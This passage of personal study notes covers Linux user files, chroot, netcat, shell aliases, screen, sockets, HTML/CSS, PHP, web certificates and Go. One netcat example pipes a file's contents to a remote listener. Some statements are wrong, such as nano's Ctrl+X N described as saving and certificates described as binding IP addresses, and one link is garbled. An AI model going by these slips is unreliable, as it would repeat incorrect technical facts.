    + Some older UNIX systems might store the actual password hash here, but modern systems use /etc/shadow instead.
  * `UID` is the User ID
    + This is the user ID number (UID) assigned to the user.
    + The UID is used by the system to identify the user, rather than by their username. It’s referenced for file permissions and ownership.
    + In this field :
      - 0 is the root user (the superuser).
      - 1-999 are t ypically reserved for system accounts and services (like daemon, bin).
      - 1000+ are generally used for regular user accounts (though this cutoff can vary by Linux distribution).
      - So, you would see 0 for `root`, and typically 1001, 1002, ... for regular users.
  * `GID` is the Group ID
    + It links the user to a default group, specifying the user’s group permissions.
    + The group name corresponding to this GID is defined in `/etc/group`.
    + The system uses the GID for permissions to files and directories.
    + For instnace, if a user is assigned a primary group with GID 1001, they’ll inherit permissions associated with that group.
  * Comment (User Info / GECOS Field)
    + This field often contains additional information about the user. It’s also called the GECOS (General Electric Comprehensive Operating System) field, named after an early operating system.
    + Usage: It’s generally used to store the full name of the user, along with optional extra information (such as their phone number, office location, etc.).
    + It can contain multiple pieces of information separated by commas, though typically it just stores the full name. 
    + Example: `John Doe`, or `John Doe,Room 101,123-456-7890`
  * `home_directory`
    + This is the absolute path to the user’s home directory.
    + It is the directory where the user starts when they log in, and it’s where their personal files, configurations, and settings are stored.
    + Most regular user home directories are located under `/home`, e.g., `/home/johndoe`.
    + The root user’s home directory is usually `/root`.
  * `shell` is the Login Shell
    + This is the path to the default shell that the system runs when the user logs in.
    + The login shell defines the command-line interface for the user. It can be any shell installed on the system (such as `/bin/bash`, `/bin/zsh`, or `/bin/sh`).
    + A list of all valid shells is available at `/etc/shells`, see [`/etc/shells`](#etcshells)
    + If this field is set to /usr/sbin/nologin or /bin/false, the user cannot log in interactively.
    + This is common for system accounts and service accounts to prevent shell access.

#### `/etc/shadow`

#### `chroot`

- **This part has to be re-processed, and studied hands-on with a shell**
- The `CHROOT_DIR` (or simply chroot directory) is a directory that serves as the root directory for a program or user, but only within a restricted environment. It’s used when executing a chroot (short for "change root") command, which changes the apparent root directory for a running process and its children.
- It's useful for 
  * Isolating Processes: By restricting a process to a specified directory, it creates a separate environment, effectively "jailing" the process so that it can’t access files or directories outside of its specified `CHROOT_DIR`.
  * Enhancing Security: Commonly used for security purposes, especially for running potentially risky or unknown applications. For example, web servers, FTP servers, and other services can run within a chroot jail to minimize damage from potential security vulnerabilities.
  * Testing and Development: Developers can set up different versions of libraries and dependencies in `CHROOT_DIR` without affecting the main operating system environment. It’s a safer way to test and debug software.
  * System Recovery: chroot can be used to "enter" a separate Linux installation, such as when you need to repair a system from a live CD by accessing it from within a chroot environment.
- When you use the chroot command, it:
  * Creates a New Root Environment: It designates a specific directory as the new root (/) for any  process running within it.
  * Restricts Path Access: Processes inside the `CHROOT_DIR` environment cannot access files outside this directory, as they see it as the root of the filesystem.
  * Executes Commands in the Environment: Any command you run within this environment uses the filesystem and libraries available in the `CHROOT_DIR`.
- Example of Setting Up a `CHROOT_DIR` :
  * Suppose we want to set up a basic chroot jail in /var/chroot for testing purposes:
    + Create the `CHROOT_DIR`: `sudo mkdir -p /var/chroot`
    + Copy essential system binaries, libraries, and dependencies into this directory. For example:
    + ```bash 
      sudo cp /bin/bash /var/chroot/bin/
      sudo cp -r /lib /var/chroot/
      sudo cp -r /lib64 /var/chroot/
      ```
    + You’ll need to include all libraries required by binaries inside `CHROOT_DIR`, as they won’t have access to the main system libraries.
    + Switch to `CHROOT_DIR` : `sudo chroot /var/chroot /bin/bash`
    + After this command, you’ll be inside a restricted shell where `/var/chroot` is treated as /, meaning you’re effectively isolated from the actual root filesystem.
    + To exit the chroot environment, simply type exit or press Ctrl+D.
- Practical Uses of CHROOT_DIR
  * Web and FTP Servers: Servers running in chroot jails are restricted to only those files they need to function, minimizing access to the rest of the system.
  * Package Compilation: Distributions often use chroot environments to build software packages without conflicting dependencies.
  * System Recovery: If you boot a system from a live CD, you can chroot into the system’s root partition to run commands as if you were in the installed environment, allowing repairs or updates.
-  Limitations of chroot
  * Not Full Isolation: chroot isn’t a replacement for full containerization (like Docker or LXC), as it doesn’t isolate network, process tables, or other system-level resources.
  * Requires Root Privileges: Only users with root access can create or execute commands within a chroot environment.
  * Limited Security: While it adds a layer of security, advanced users can sometimes escape a chroot jail if it’s misconfigured, which is why it’s generally used alongside other security practices.

#### `nc` (netcat)

- The nc (or netcat) utility is a tool to do things involving TCP, UDP, or UNIX-domain sockets.
- It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6.
- Telnet seems to be netcat's precedessor (or a friend ?)(i.e., is telnet still used today ?).
- Unlike telnet, netcat separates error messages onto standard error instead of sending them to standard output, as telnet does with some. 
- `nc -l -p 12345` listens on port `12345`.
- `nc ipaddr 12345` will send whatever it recieves afterwards to IP address `ipaddr` on port `12345`
  * If you just run this (raw) command, you will be able to write things, press `ENTER` (indefinitely) and it'll send what it gets from standard input.
  * If you run `somecommand | nc ipaddr 12345`, it'll send the output of command `somecommand`
  * For instance, `somecommand` could be `cat file`. :)
  * On the reciever machine, `nc -l -p 12345 > received_file` will store the recieved data into `received_file`. :)

#### `alias` 

- Aliases in Linux are used to replace some commands by some others (often simpler ones.)
- For instance : `alias ls='ls --group-directories-first'` will run `ls --group-directories-first` each time the user writes `ls`.
- It looks like in this case, options (such as `--group-directories-first` in the previous example) will be applied by default on each use of `ls` 
- i.e., even if other options are applied (rather than only applying only when `ls` is used alone, without any other options)
- Aliases only work for the current login session (!)
- So what's typycally done is to write them in `.bashrc`, the file that's executed on each login session start.
- If the shell is `zsh`, it should be put in `.zrc` (obviously)
- You can deal with command arguments by adding `$1`, `$2`, ... in the alias.
- If the arguments involve quotation marks, it might not work. Use a function, like so :
```
gitpush() {
  git add .
  git commit -m "$1"
  git push
}
```

#### Other small commands

- ``date`` : Prints the date of the machine you are working on. You can specify an output format (see manual).
  * `(sudo) date MMDDhhmmYYYY.ss` will set the date to `DD/MM/YYYY hh:mm:ss`
- ``cal`` : Prints a calendar.
- ``exit`` : Exits the current terminal.

#### Remaining commands to deal with

- Use which or command -v to check for specific commands in your environment.
- compgen -c lists all available commands, helpful after installing a new package.
- ``tee``, ``boundary``, ``vboundary``
- ``wc``
- ``tr``
- ``sed``
- ``echo``
- ``printenv`` affiche (aussi) les variables d'environnement
- ``shred`` removes things safely. https://www.gnu.org/software/coreutils/manual/html_node/shred-invocation.html
- ``nice`` runs commands with modified scheduling priority (https://gnu.org/software/coreutils)
- ``pwd`` prints working directory
- ``shutdown`` shuts down
- ``make`` is very powerful
- ``emacs`` you know what this is
- ``tree``
- ``mv``
- ``cp``
- ``scp``
- ``source``
  * ``source a.sh`` with ``a.sh`` containing for instance ``cd /path/to/somewhere`` works !
- ``bash`` (Bourne-Again Shell)(Difference with source ?)
- ``alias``
- ``nano``
- ``exec`` 
- ``rm``
  * ``rm -- -f``
- ``history`` (Beware, everything you do is saved...)(Permanently?)(And where ?)
- ``lsblk``
- ``df``(``df -h /boot``)
- ``find``
- ``ps``, (``ps -fe``)
- ``exec``
- ``file``
  * Allows to see the nature of some file.
  * This is very useful : file extensions in Linux are sometimes misleading...
- ``wget``
- ``export`` 
- ``awk``, `mawk`
- ``nslookup``, `dig`, `host`, `named`
- ``chmod``
- ``chroot``
- ``chown``
- ``chgrp``
- ``chfn``
- ``chrt``
- ``chsh``
- ``chvt``
- `chsh`, `chfn`, `passwd`, `shadow`, `usermod`, `chpasswd`, `login.defs`, `su`, `login`, `pam`
- `useradd`, `newusers`, `userdel`
- `subgid`, `subuid`, `newgidmap`, `newidmap`
- `chage`, `sulogin`, `pwck`, `pwconv`, `pwunconv`, `grpck`
- `group`, `groupmod`, `gshadow`, `groupadd`, `groupdel`
- `pam`, `Netpbm`, `pbm`, `pgm`, `ppm`, `pnm`, `libnetpbm`
`- https://www.gnu.org/software/coreutils

### Other Linux packages

- base-files
- base-passwd
- bash
- bsdutils
- dash
- diffutils
- findutils
- grep
- gzip
- hostname
- init
- libdebconfclient0
- login
- ncurses-base
- ncurses-bin
- sysvinit-utils
- ubuntu-minimal
- ubuntu-standard

#### Nano

- When in nano, `CTRL + X` `Y` `ENTER` saves and exists.
- `CTRL + X` `N` saves and exists.
- `CTRL + K` allows to _cut_ large chunks of text. 
- In particular, `CTRL + K` allows to _remove_ large chunks of code !

#### Tldr

- TLDR shows shortened manpages for commands with _pratically useful_ and **relevant** examples.
- As opposed to `man`, despite which's honourable effort to help users, is much less easy to read.

#### Cron

- Cron is used to perform some tasks as precise given times
- For instance, running a script everyday at a given hour.

#### Poppler-utils

Poppler is a PDF rendering library. It is based on xPDF, which is itself based on Motif.
Recall that you can see all commands provided by a given (dpkg- or apt-installed) package using ``dpkg -L packagename``.
Commands provided :
- ``pdfattach``

#### xpdf or xpopple

xpopple is a viewer for Portable Document Format (PDF) files. xpopple runs under the X Window System on UNIX.
The difference between xpopple, poppler and xpdf is quite subtle (and historical). I don't quite get it, but reading from the xpdf manual : 
"xpopple uses the Poppler library to process PDF files. Poppler was originally derived from [the] Xpdf suite, but Poppler  doesn't            include the Xpdf viewer program itself. xpopple is the Xpdf program, modified to use Poppler".

_Bref_, these are PDF viewers widely used on Linux Desktop Environments such as GNOME or KDE.

#### Screen

- Screen is a terminal multiplexer, i.e. it allows to run separate shells (in separate processes) and, in particular. 
- Remember that when you run a command in a shell, it will execute a program as a process which will be a child-process of your shell. This implies that if your shell is a remote shell (typically, connected using SSH), since the shell process is killed as soon as the connexion is stopped, all its subprocesses will be killed too and the programm will be killed. This way, for instance, you can't have a persistent program launched (without having it attached to the terminal - even by running it in the background by using `command &`). 
- Terminal multiplexers allow to run processes without them being a child process of your shell.
- `screen -S <name>` creates a screen
- `screen` starts a new screen session
- `screen -r` reattach to existing session
- `screen -ls` List existing screen sessions
- `Ctrl-A d` **detach from the current session**
- `Ctrl-A c` Create a new window
- `Ctrl-A n` Switch to the next window
- `Ctrl-A p` Switch to the previous window
- `Ctrl-A k` Kill the current window

### Commands cool things

- (pipe, double pipe, <, >, <<, >>)
- comm -23 <(apt-mark showmanual | sort -u) <(gzip -dc /var/log/installer/initial-status.gz | sed -n 's/^Package: //p' | sort -u)
- comm -23 <(apt-mark showmanual | sort) <(apt-mark showauto | sort)

### Linux miscellaneous things

- ``cd "$(cat file)"`` to go to the path written in ``file``.
- ``cd $OLDPWD`` gets back to the previous working directory - or, even better : ``cd -`` does so too !

## Operating systems

### The kernel

- The kernel is a first interface between hardware and software. It is the "core" of the OS. The kernel manages processes, I/O, along with many other things. It has complete control on the system.
- Fundamentally, a kernel is just a piece of software. Heuristically, we call it "kernel" because it is at the core of the Operating System in the sense that it has control on all the system and manages many things. Applications and the (rest of the) OS make syscalls (calls to the kernel) to "ask for permission" to do stuff on the hardware (writing stuff in the RAM, for instance). 
- A syscall happens when any piece of software needs access to anything related to hardware. The kernel may refuse it. By default, the OS is in "user mode". If the syscall is accepted, the OS passes in "Kernel mode" the time necessary to do the stuff (and then switches back to user mode). When in user mode, the OS and applications don't have permissions to do everything.

### I/O and drivers

- Drivers are necessary to handle some input. 
- A driver teaches the operating system to handle some specific i/o with peripheral devices. 
- Many drivers are already installed by default.
  * The most common ones are HID (Human Interface Devices) drivers and Mass Storage drivers.
  * These are "subnorms" of the USB norm. 
  * The HID drivers are used for handling devices such as keyboard, mouses...
  * The mass storage devices are used for handling mass storage devices such as USB sticks, (internal or external) hard drives...
  * The reason why connecting a keyboard, a mouse or a storage device on a computer always works on first try is that these drivers are **installed by default** on most (every) Operating Systems (for ovious reasons : everyone needs at least a keyboard, and it is quite obvious that almost everyone will want to plug a mouse or a hard drive to their PC)
  * But, sometimes some peripherals require to manually install drivers. For instance, for serial communication, you will likely need a Serial-USB driver to teach to your OS how to handle serial communication on USB ports.
  * Drivers can be seen as extensions to your OS.
  * For futher investigation, read the wikipedia page for USB. 
  * But also, recall and don't forget  that the USB norm is over 500 pages long.

### Sockets

- Sockets are an abstraction. They are used to receive data over a network.
- What we refer to as sockets are the piece of code (of program) that acts as **communication endpoints** :
- Sockets are what sends and recieves data. 
- They are identified by an IP address and a port number : for instance, 192.168.1.1:8080.
- The operating system binds applications to sockets, hence, in this way, binds applications to ports.
- This way, the Operating System knows which application it must redirect packets to.
- Indeed : when the OS recieves (via its NIC) a packet on a given port, how does it know which application should be the actual recipient of this packet ?
- At a low level, at their core, sockets are application programming interfaces (API) provided by the operating system (On Unix/Linux : Berkeley Sockets, on Windows : Winsock).
- So, when two application want to communicate, here's what happens :
  * On the server side, a socket is created and bound to an IP address and port.
  * (Note that it is more correct to say that the OS binds sockets to an IP and a port - rather than saying that an application is. But whatever.)
  * The server listens for incoming connections.
  * A client creates a socket and attempts to connect to the server.
  * Once a connection is established, the two sockets (client and server) can exchange data.
  * Note : the server will listen on a given fixed port - typically such as 80 or 443.
  * The client, however (the client's OS), will also bind a socket to an IP and a port - but note that this time, the port is random.
  * As a matter of fact, **source ports are random**. When an application wants to send data - typically, a request to a server, the OS binds a socket to a port. 
  * This port is random. Because, why not.
  * When the server responds, the source and destination ports are swapped (normal !).
- Sockets must not be confused with Websocket.
  * Websocket(s) is a communication protocol. 
  * It basically serves the same function as HTTP.
  * It works over TCP.
  * The difference with HTTP is that it provides a simultaneous two-way (duplex) communication channel over a single TCP connection.
  * Unlike traditional HTTP, which is stateless and requires repeated requests (polling), WebSockets maintain an open connection.
  * Polling is a technique that **repeatedly requests data** from a server at **regular intervals until** a desired response is received or a timeout period elapses.
  * RFC 6455 states that WebSocket "is designed to work over HTTP ports 443 and 80 as well as to support HTTP proxies and intermediaries". 
  * Obviously, to communicate, Websocket uses sockets ! 

### Miscellaneous OS information

- Swapping is the process of moving data from the computer's RAM and storage (hard drive).
  * This is often used to get some more memory space on computers in situations that require more RAM that there actually is.
  * Hence the name : RAM <-- swap --> Storage
  * On Windows for instance, if you see files ending in `.swp`, especially in a saturated RAM context, you know what this is !
  * On Linux, you can type `vmstat` too see the current swap usage, or `top`, or `htop`.q

## Web

### Web development

- ``npm`` = Node Package Manager
- ``npm install -g typescript``
- VSCode ``remote ssh server``
- VSCode ``Live server``
- A package manager is a tool that manages all dependencies in a project. There exist some for all languages : 
  * C# -> NuGet, 
  * Java -> Maven, 
  * PHP -> Composer, 
  * Ruby -> Gem
  * NPM -> JavaScript

### HTML

#### HTML Basics

Basic structure of a HTML page :
```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <title>Titre</title>
    </head>

    <body>
        <h1> h1 </h1>
        <h2> h2 </h2>
        <h3> h3 </h3>
        <h4> h4 </h4>
        <h5> h5 </h5>
        <h6> h6 </h6>
        <p> Paragraph <br/> Carriage return</p>  

        <p> <em>Another</em> paragraph, with a line skip </p>  
    </body>
</html>
```
- General facts
  * Code Indentation is optional (improves readability, will be ignored by browsers)
  * Comments can be added with : ``<!-- Comment -->``
  * NB : Anyone will be able to read the HTML of your page...
- Tags
  * There are two types of HTML tags : 
    + Pairwise tags/non self-closing : ``<body> </body>``
    + Self-closing : ``<img src="img.png" />``
    + Note : the ending `/` is optional. It is common to put it anyway.
  * There are also two types of HTML tags
    + Online tags : ``<span>``, ``<em>``, ``<strong>``
    + Block tags : ``<div>``, ``<p>``, ``<hi>``
  * Tags have attributes : ``<tag attribute="value">``
  * The ``<html>`` tag contains all the html code.
  * The ``<head>`` tag contains nothing that will be displayed by browsers, just (useful!) meta information about the page.
  * The ``<body>`` tag contains every element that will be displayed on screen.
  * ``<meta charset="utf-8" />`` indicates the encoding of the file. UTF-8 is cool. Make sure your files are saved as utf-8.
  * Use ``<br>`` (or ``<br/>`` for carriage returns)
  * The ``<title>`` is what is displayed on top of the screen (on the tab in Chrome). It's also what's displayed on Google Searches
- Paragraph (``<p></p>``) tags for paragraphs
- ``<h1></h1>``...``<h6></h6>`` correspond to `#`...`######` in Markdown. 
- More generally there are many correspondences between Markdown and HTM(arkup)L : it is possible to use HTML tags in Markdown
- ``<strong>`` bits are displayed in **bold** by default. CSS allows to display ``<strong>`` parts as we want.
- Idem for ``<mark>`` (<mark>marked</mark>) parts. CSS allows to display them as we want.
- (Probably?) idem for ``<em>`` (<em>emphasized</em>) parts.
- Unordered lists with ``<ul>``. Text between the tag the the first element (``<ul>here<li>``) is aligned with the elements, without bullet point.
- It is possible to make sublists into lists - that is, floors.
- There are ordered (``ol``) and unordered (``ul``) lists (and definitions lists, but who cares about them). Items are delimited with ``<li>``.
- Hyperlinks require the ``<a href="link"></a>`` tag. 
  * You can put a hyperlink to another page of the same website : ``<a href="path/to/other/page.html>``.
  * Do not put spaces, uppercase letter, and special caracters (including 'é', 'è', 'à'...) in file or folder names.
  * You can put hyperlinks to different tags on the same page  : ``<tag id="tag_name">`` and then ``<a href="#tag_name>``. That's when you see ``#``'s in URLs !
  * NB : do not put spaces in ``id``s, you could encounter problems.
  * You can henceforth link to specific parts (tags) of other pages : ``<a href="ancres.html#rollers">``
  * You can put titles to hyperlinks : ``<a href title="A title that will be displayed when hoovering into the hyperlink">``
- ``id``'s are used to give (unique) identifiers to tags. They are used a lot to apply styles to specific things in CSS.
- You can insert images with ``<img src="montagne.jpg" alt="Photo de montagne" title="Montagne"/>>``. 
  * ``src`` is the (path to) the file (the image).
  * ``alt`` is used to describe the content of the image. It is the text that will be displayed if the image doesn't load. It's used by search engines to know what's supposed to be on the picture. 
  * Remember : do not put uppercase letters, spaces or special caracter in file or folder names (or paths).
  * ``title`` is the text that will be displayed in the info-bubble that will appear when hoovering the image.
  * Thumbnails : ``<a href="montagne.jpg"><img src="montagne_thumbnail" alt="montagne thumbnail" title=cliquez pour agrandir/></a>``
- Figures (``<figure>``) are a _semantic_ tag that allow to know that this tag is a figure used to illustrate some text.
  * It is possible to add the ``<figcaption></figcaption>`` tag that will add a caption underneath the figures.
- The ``<span>`` tag can be used to point at specific words (for CSS).
- The ``<div>`` tag can be used to point at to blocks of words (for CSS).

### CSS

- General facts
  * Comments are written using /* */
  * There are three ways (places) to write CSS :
    + In a ``.css`` file
    + In the header (``<head>``) of the HTML, using the ``<style>``tag. and closing) ``style`` tags.
    + Directly into the tags, using the ``style`` attribute. 
    + For the three methods, just write the css code normally, either between the ``<style>`` tags, or between quotation marks for the ``styte`` attribute.
    + The first method is widely used and highly recommended.
  * Use ``<link rel="stylesheet" href="style.css" />`` to indicate the CSS file associated to the HTML page (file).
- General syntax : 
```css
tag1
{
  property1: value;
  property2: value;
  property3: value;
}

tag2, tag3
{
  property4: value;
  property5: value;
  property6: value;
}
.classname
{
  property7: value;
  property8: value;
  property9: value;
}
```
- Properties
  * ``color`` indicates the color of the text. Default is black. It is possible to write it as ````, with ``a``,``b``,``c`` integers in base 10.
  * ``font-size: 1em``. Default is ``16px``, or ``12pt``, or **``1em``**.
    + Absolute value : in ``px``, ``pt``, ``em``, ``in``, ``cm``...
    + Note : ``em`` corresponds to the default font size value. Conversely the default font size value is ``1em`` !
    + Relative value : ``xx-small``, ``x-small``, ``small``, ``medium``, ``large``, ``x-large``, ``xx-large``, 
    + Relative values are recommended : will fit better on different screen/window sizes, might better adapt to browser zooming...
  * ``font-family: font;``
    + By default, the browser will search on the (local !) client computer if the font ``font`` exists. 
    + If it does not exist, the browser will render with a default font (which is ``Times New Roman`` for Chrome...!)
    + You can specify multiple fonts : ``font-family: font1, font2, font3, font4;``
    + The last font is often ``serif``. Éventuellement ``sans-serif``.
    + ``Arial``, ``Arial Black``, ``Comic Sans MS``, ``Courier New``, ``Georgia``, ``Impact``, ``Times New Roman``, ``Trebuchet MS``, ``Verdana`` are classical fonts that work well on all browsers (but not very original).
    + [Here is an updated list of CSS secure fonts](https://www.w3schools.com/cssref/css_websafe_fonts.php)
    + **If the font name contains spaces, it is mandatory to enclose it in quotation marks** ! (Keep quotes around font names)
    + It is also (fortunately!) possible to make the browser download a font.
    + ``fontsquirrel.com`` or ``dafont.com`` provide copyright-free fonts. ``fontsquirrel.com`` also provides "CSS 3 packs", with multiple formats.
    + Some font formats include : 
      - ``.ttf``, TrueType Font. The most standard one, seemingly.
      - ``.eot``, Embedded OpenType. Works on Internet Explorer only. Proprietary format, owned by Microsoft.
      - ``.otf``, OpenType Font. 
      - ``.svg``, Scalabe Vector Graphics. 
      - ``.woff``, Web Open Font Format.
    + Note : Font files, such as TrueType Font (.ttf) files, are not text files, so they are not typically associated with a specific character encoding like UTF-8, ANSI, or Unicode. Instead, they are binary files that contain a mix of binary data, structured tables, and occasionally embedded metadata that might include text strings.
    + Note : Some fonts are the same whatever ``font-weight`` you give them. Sometimes ``font-weight`` (boldness) does not impact the font !
    + To know whether a given font format works on which browser : 
      - ``https://www.lambdatest.com/web-technologies/eot``
      - ``https://www.lambdatest.com/web-technologies/woff``
      - ``https://www.lambdatest.com/web-technologies/ttf``
      - Note : ``https://www.lambdatest.com/web-technologies/otf`` does not exist. ``CTRL+F`` (or ``F3``) on ``https://www.lambdatest.com/web-technologies/`` yields that it is actually together with ``https://www.lambdatest.com/web-technologies/ttf``
  * **Declaring a new font** 
```css
@font-face {
font-family: 'Font Name';
src: url('path/to/font.ttf');
}
```
  * Importing multiple formats can be a good habit, browsers will automatically select their preferred format (one that they support) :
```css
@font-face {
    font-family: 'Font Name';
    src: url('Font Name.eot') format('eot'),
         url('Font Name.woff') format('woff'),
         url('Font Name.ttf') format('truetype'),
         url('Font Name.svg') format('svg');
}
```
  * ``font-style``
    + ``normal``
    + ``italic``
    + ``oblique``
    + ``oblique`` is kinda like ``italic`` but different. It's actually like ``italic`` by default (with the default ``Times New Roman`` font)...
  * ``font-weight``
    + ``normal``
    + ``bold``
    + Note : as already mentionned before, some fonts are unaffected by the ``font-weight`` property : they can't be bold.
  * ``text-decoration``
    + ``underline``
    + ``line-through`` : Strikethrough 
    + ``overline`` : Overline
    + ``none``
  * ``text-align``
    + ``left``
    + ``center``
    + ``right``
    + ``justify``
    + Only works for block tags, not for inline tags
  * ``float``
    + For images essentially, can apply to other things aswell (charts, buttons, ...). 
    + Allows text to float around an image : it's like the image was inserted into the text, and the text moved a bit to give the image some room.
    + ``<img src="...", alt="Image flottante", style="float: right/left/center"
            />
  * ``clear``
    + This allows to _stop text from floating_. 
    + It basically says : Yes, the image (or whatever thing has the attribute ``float``) was supposed to be "inserted" into the text (allowing text to float around it), but no, the following text (enclosed in the tag that has the (style) attribute ``clear``) should not.
    + More specifically: 
      - ``clear: left`` means stop floating around things floating left (``float: left``)
      - ``clear: right`` means stop floating around things floating right (``float: right``)
      - ``clear: both`` means stop floating around both
  * ``background-color``
    + The background color of an element. It may be a div, a span, some text... For text, it will be text highlighting.
    + To set the page background color : 
```css
body
{
    background-color: black; /* Page background color */
    color: white; /* Text color (important) */
}
```
* ``background-image``
  * You can set the background color and background image to any HTML element.
- **Heritage**
  * Any CSS property given to a tag will apply to **all children**.
  * Hence the name : **Cascading Style Sheets** !
  * Note that since all tags are children of the ``<body>`` tag, properties given to ``<body>`` will apply to everyone by default (except told otherwise, cf. next point)
  * Priority rules apply from narrowest to broadest (intuitively).
- It is possible to specify colors using either
  * Hexadecimal notation
  * RGB colors (``rgb(a,b,c)`` with ``a,b,c`` integers in base 10)
  * Hexadecimal colors
  * Hexadecimal colors with transparency
  * RGB colors
  * RGBA colors
  * HSL colors
  * HSLA colors
  * currentcolor : refers to the ``color`` property of the element. Will be black (default) is the HTML element has no ``color`` property given by CSS.
  * [One of the 140 predefined CSS colors](https://www.w3schools.com/cssref/css_selectors.php)
- Selectors :
  * ``id`` and ``class`` are attributes that work for **all** HTML tags.
    + Use ``.class_name`` to refer to the tags that have this class. 
    + Classes are used to group elements.
    + Use ``#id_name`` to refer to the tags that have this id.
    + Ids are used to point specific elements. 
    + It looks like they work the same anyway (i.e. it looks like you can group things using ``id``, and the behaviour remains the same) but don't play with fire too much.
  * The ``<span>`` tag can be used to refer to specific words.
  * The ``<div>`` tag can be used to refer to blocks of words.
  * ``A,B,C,D {...}`` will refer to all occurences of A,B,C and D (without having to copypaste)(A,B,C,D can be ``h1, em, .class_name, #id_name).
  * ``*`` is the universal selector : ``* {...}`` will apply to _all_ tags.
  * ``A B`` will refer to all occurences of B **contained in** an occurence of A.
  * ``A + B`` will refer to all occurences of B **right after** an occurence of A.
  * ``A[attr]`` will refer to all occurences of A **that do have** the attribute ``attr`` (set to some value).
  * ``A[attr="value"]`` will refer to all occurences of A that **have** the attribute ``attr``  **set** to value ``value``.
  * ``A[attr*="value"]`` will refer to all occurences of A that **contain** ``value`` in their attribute ``attr``.
  * Other selectors : https://www.w3.org/Style/css3-selectors-updates/WD-css3-selectors-20010126.fr.html
  * [Comprehensive list of CSS selectors](https://www.w3schools.com/cssref/css_selectors.php)

### Django

- Uninstalled migrations -> python -m django manage.py migrate
- ```You have 21 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): admin, auth, contenttypes, sessions, wordcounter.     Run 'python manage.py migrate' to apply them.```

### PHP

- PHP used to stand for Personal Home Page, but now the official meaning is "PHP : Hypertext Processor"
- It's a widely-used open source general-purpose scripting language, it's especially oriented for web development. 
- It can be embedded into HTML :
```html
<!DOCTYPE html>
<html>
    <head>
        <title>Example</title>
    </head>
    <body>

        <?php
            echo "Hi, I'm a PHP script!";
        ?>

    </body>
</html>
```
- PHP is "server-side", which means that the code is executed on the server. As opposed to client-side JavaScript, HTML is generated (on the server) and _then_ sent to the client. The client receives the results of running that script, but it only recieves HTML. In particular, they do not know what the underlying code was. A web server can even be configured to process all HTML files with PHP, and then there's no way that users can tell that PHP is being used.

### Further reading and tools

- World Wide Web Consortium :
  * https://www.w3.org/
- W3Schools
  * https://www.w3schools.com/
  * HTML, CSS, JavaScript, SQL, Java, PHP, Typescript, Angular, Vue, Node, Git, XML, Django, C, C++...
  * Useful to refresh stuff, but not necessarily to learn.
- All HTML Tags 
  * https://www.w3schools.com/tags/default.asp
- CSS Compaptibility tables
  * https://www.caniuse.com
  * https://www.normansblog.de
- Further reading on CSS, on W3C : 
  * https://www.w3.org/Style/
- Lea Verou : an inspiring Web Designer
  * https://projects.verou.me/css3patterns/
- CSS 3 Patterns, and more
  * https://tailwindcss.com/ (Used on bulle.rezel.net !)
  * https://css-pattern.com/
  * https://10015.io/tools/css-background-pattern-generator
  * https://cssgradient.io/blog/gradient-patterns/
  * https://bansal.io/pattern-css
- Magic Pattern
  * https://www.magicpattern.design
  * https://www.magicpattern.design/tools/css-backgrounds
- Free Frontent
  * https://freefrontend.com/
  * https://freefrontend.com/css-background-patterns/
- Design
  * https://superdesigner.co/tools/css-backgrounds
- Bootstrap
  * https://www.w3schools.com/bootstrap/bootstrap_ver.asp
- Resources for Developers, by Developers
  * https://developer.mozilla.org/en-US/
- Web.dev
  * https://web.dev/
- HTML, CSS, JavaScript, SVG, JS API (and more) **browser compaptibility tests**, and (importantly) **features** (possibilities) :
  * https://www.lambdatest.com/web-technologies/
- Tests for web-related stuff :
  * https://www.lambdatest.com/
- Echo framework for Go 
  * https://echo.labstack.com/docs

### Web certificates

- Web authenticity certificates are used to certify that someone talking to an IP address (or domain name) gets server responses that _are indeed_ sent by the right server, and not by some other machine that attempts to send you something else.
- This is (would be) called a **man in the middle** attack.
- Note that this kind of authentification is analoguous to what does the ``known_hosts`` file for SSH connections.
- When hosting a HTTPS website, say ``https://www.rezel.net`` for instance, you have to contact a [Certificate authority](https://en.wikipedia.org/wiki/Certificate_authority) that will sign a certificate linking the web server's IP adress to its public key. 
- More precisely, a Web certificate contains, amongst [other things](https://en.wikipedia.org/wiki/Public_key_certificate#Common_fields) :
  * An emission date
  * An expiration date
  * The server's public key
  * The server's IP address
- The Certificate Authority then computes a signed hash of this data and gived is it to the domain name owner. The web server then gives the certificate among with the signed hash with all the requests it sends.
- The signature validates the _coherence_ of the information contained in the certificate, i.e. the coherence between all _certificate fields_ : the signature ensures that, for instance, the domain name ``https://www.rezel.net`` is linked to the Public key ``f60473d34377c4a094027fde23d4efb19deba0a36101d6c3ed7a3e314dcca142``.
- Client browsers can check that the signature is legitimate. This is most likely done by decrypting the signature itself using the Certificate authority's public key. Recall that only someone who has a private key can encrypt something that can be decoded usign the public key. Hence, if the fingerprint can be decoded, it means that the certificate is legit.
- Client browsers that recieve data from a distant server whose certificate is inexistant or not signed by a Certificate Authority will reject the data and tell the user that the website is not secure. Note that the browser will still often let the user access the website, but will warn the user that the website might be dangerous as the certificate is invalid.
- Acquiring a certificate is a procedure named [Certificate signing request](https://en.wikipedia.org/wiki/Certificate_signing_request). 
  * When requesting a certificate, the latter neither has an emission date, nor does it have an expiration date. These are decided and set by the Certificate Authority, when giving the (signed) certificate back. 
  * The certificate authority will ask the requester to certify its identity : by asking him to make the domain name point to some random text. (Note : the DNS is a complex system, it can be used to make a domain name point to basically anything : some text...)

### Web hosting

- Proxies, reverse-proxies, are often used. Firewalls are always used. 
- When hosting a website, you must always specify the port the server is listening onto. 
- Requests : port 3000 (cf. https://en.wikipedia.org/wiki/List_of_²_and_UDP_port_numbers port 3000) or 80/443 (HTTP/HTTPS) ? (...)
  * How com Sacha Montel's website listens on port 8080 and not 43 ?? When browsers emit requests, they should emit either on 80 or 443 don't they ?

### Identity providers

#### Authentik

### Self-hosting

#### CodiMD

CodiMD is what Rezel hosts for its self-hosted collaborative markdown notes.

#### HedgeDoc

HedgeDoc is a fork of CodiMD.
Apparently, a lot of people say that when HedgeHoc 2.0 will come out, it'll be amazing. :O

### Web miscellaneous things

## Go

### Go basics 

- Go is a compiled language. 
  * `go build file.go` to compile a go file. Then, run the executable (`./file`)
  * `go run file.go` performs the same operation, but stores the excutable somewhere, runs it, and then deletes it. It's very useful for one-shots.
- The first line of a file indicates the package the file is in.
  * Every Go program is organized in a package. 
  A package is a collection of source files in the same directory that allows variables, types, and functions to be visible among other source files within the same package. 
